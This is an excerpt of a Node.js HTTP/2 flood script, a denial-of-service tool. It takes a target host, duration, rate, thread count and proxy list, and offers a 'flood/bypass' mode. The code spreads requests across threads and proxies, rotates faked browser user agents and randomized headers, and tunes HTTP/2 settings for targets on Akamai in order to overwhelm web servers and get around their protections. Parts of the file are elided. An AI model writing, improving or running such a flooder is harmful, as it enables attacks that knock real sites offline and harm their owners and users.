...
const ciphers =
    "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
...
if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt flood/bypass`);
    process.exit();
}
...
colors.enable();
const coloredString =
    "Recommended big proxyfile if hard target.\n >  Only support HTTP/2.\n >  Use low thread(s) if you don't want crash your server."
        .white;
if (cluster.isMaster) {
    console.clear();
    ...
    console.log("[>] Time: ".magenta + process.argv[3]);
    console.log("[>] Rate: ".blue + process.argv[4]);
    console.log("[>] Thread(s): ".red + process.argv[5]);
    console.log(`[>] ProxyFile: ${args.proxyFile} | Total: ${proxies.length.toString()}`);
    console.log("[>] Mode: ".green + process.argv[7]);
...
function runFlooder() {
    ...
    const generateUserAgent = (browser) => {
        ...
        const version =
            Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
        ...
        const userAgentMap = {
            ...
            a: `Mozilla/4.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            b: `Mozilla/6.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            c: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            d: `Mozilla/7.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            e: `Mozilla/8.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            f: `Mozilla/4.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.6.1126.0 Safari/537.36`,
            g: `Mozilla/13.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.6.5340.0 Safari/537.36`,
            h: `Mozilla/16.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.6.3824.0 Safari/537.36`,
            i: `Mozilla/7.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.6.6664.0 Safari/537.36`,
            j: `Mozilla/11.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.2.251.0 Safari/537.36`,
            k: `Mozilla/16.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.9.3064.0 Safari/537.36`,
            l: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.5.2400.0 Safari/537.36`,
            m: `Mozilla/11.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.2.5036.0 Safari/537.36`,
            n: `Mozilla/8.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.8.9149.0 Safari/537.36`,
        };
    ...
    const rateHeaders = [
        ...
        { "source-ip": randstr(5) },
        //{ "viewport-width": "1920"  },
        //{ "cookie": cookieString(scp.parse(response["set-cookie"]))
    ...
    const platformd = ["Linux", "Windows", "Mac OS"];
    let headers = {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("stream", (stream, headers) => {
            if (isp === "Akamai Technologies, Inc.") {
                ...
                stream.priority = Math.random() < 0.5 ? 0 : 1;
                stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
                stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x04)] =
                    Math.random() < 0.5 ? 16777215 : 16384;
                stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x05)] =
                    Math.random() < 0.5 ? 65536 : 65535;
